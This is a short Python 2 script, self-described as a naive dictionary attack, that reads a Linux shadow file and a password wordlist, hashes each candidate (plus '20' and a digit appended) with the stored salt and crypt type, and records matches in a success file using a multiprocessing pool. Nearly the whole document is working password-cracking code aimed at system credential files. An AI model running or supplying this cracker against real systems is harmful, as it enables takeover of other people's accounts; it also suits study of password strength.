'''
This is a naive dictionary attack script with a bit of multiprocessing for fun 
Linux only
'''

import time
import sys
import crypt
import multiprocessing as mp
from base64 import b64encode
import string

def multi_run_wrapper(args):
	return deCript(*args)



def  deCript(user, ctype, salt, Ppassword, rhash):
	if (ctype == '0'):
		insalt = salt
	else:
		insalt = '${}${}$'.format(ctype, salt)
	chash = crypt.crypt(Ppassword, insalt)
	if (chash == rhash):
		print "success!"
		print user, ctype, salt, Ppassword, chash, rhash
		return user, ctype, salt, Ppassword, chash, rhash
	else:
		return "fail", user, ctype, salt, Ppassword, chash, rhash

		
if __name__ == "__main__":
	passwordfile = open("password", 'r')
	userfile = open("shadow", 'r')
	passwords = []
	for line in passwordfile:
		if (line[0] == '#' or line[0] == '\n'):
			pass
		line = line.rstrip('\n')
		passwords.append(line)

	users = []
	ctypes = []
	salts = []
	rhashes = []

	for line in userfile:
		line = line.rstrip('\n')
		line = line.split(":")
		hashpass = line[1].split('$')
		users.append(line[0])
		rhashes.append(line[1])
		if (len(hashpass) > 1):
			ctypes.append(hashpass[1])
			salts.append(hashpass[2])
		else:
			ctypes.append('0')
			salts.append(line[1][0:2])

	tasks = []
	for i in range(len(users)):
		print(i)
		for j in range(len(passwords)):
			tasks.append((users[i], ctypes[i], salts[i], passwords[j], rhashes[i]))

			for m in range(11):
				#tasks.append((users[i], ctypes[i], salts[i], passwords[j]+str(m), rhashes[i]))
				tasks.append((users[i], ctypes[i], salts[i], passwords[j]+str(20)+str(m), rhashes[i]))
				#tasks.append((users[i], ctypes[i], salts[i], passwords[j]+str(19)+str(m), rhashes[i]))
				
	
	pool_size = mp.cpu_count()

	pool = mp.Pool(processes=pool_size)
	time.sleep(1)
	found_passwords = pool.map(multi_run_wrapper,tasks)
	
	for k in found_passwords:
		if (k[0] == "fail"):
			f = open("fail",'w')
			f.write(" ".join(k))
			f.write("\n")
			f.close()
		else:
			s = open("success", 'w+')
			s.write(" ".join(k))
			s.write("\n")
			s.close()


